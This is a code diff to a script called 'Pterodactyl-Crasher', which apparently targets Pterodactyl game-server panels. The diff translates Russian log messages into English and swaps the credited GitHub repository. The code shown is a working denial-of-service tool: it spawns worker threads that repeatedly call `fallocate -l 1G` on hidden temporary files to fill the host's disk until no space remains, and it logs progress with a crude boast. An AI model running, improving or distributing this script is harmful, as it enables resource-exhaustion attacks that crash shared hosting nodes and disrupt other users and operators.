@@ -10,7 +10,7 @@ function allocateSpace() {
         const target = `.___tmp_${uuidv4()}`;
         exec(`fallocate -l 1G ${target}`, (error, stdout, stderr) => {
             if (error) {
-                console.error("Нету места на хосте, ");
+                console.error("No space on the host, ");
                 reject(error);
             } else {
                 megabytes += 1;
@@ -23,7 +23,7 @@ function allocateSpace() {
 
 function displayStatus() {
     setInterval(() => {
-        console.log(`Закачал всего [ ${megabytes} ГБ ] со скоростью [ ${curr} Гб/с ]`);
+        console.log(`Uploaded a total of [ ${megabytes} GB ] at a speed of [ ${curr} GB/s ]`);
         curr = 0;
     }, 1000);
 }
@@ -37,9 +37,9 @@ function uuidv4() {
 }
 
 async function main() {
-    console.log("github.com/xdearboy/Pterodactyl-Crasher \n\nPterodactyl-Crasher");
-    console.log("Режим: забивка всей памяти");
-    console.log("Подготовка..");
+    console.log("github.com/ManucrackYT/Pterodactyl-Crasher \n\nPterodactyl-Crasher");
+    console.log("Mode: full memory");
+    console.log("Getting ready..");
 
     displayStatus();
 
@@ -56,7 +56,7 @@ async function main() {
                     worker.on('error', reject);
                     worker.on('exit', (code) => {
                         if (code !== 0) {
-                            reject(new Error(`Воркер остановился с причиной: ${code}`));
+                            reject(new Error(`The worker stopped with a reason: ${code}`));
                         } else {
                             resolve();
                         }
@@ -66,10 +66,10 @@ async function main() {
             await Promise.all(promises);
         }
     } catch (error) {
-        console.error("Закончил с причиной:", error.message);
+        console.error("Done with the reason:", error.message);
     }
 
-    console.log("Начали нахуй!");
+    console.log("Let's get the fuck started, for our reputation!");
 }
 
 if (isMainThread) {
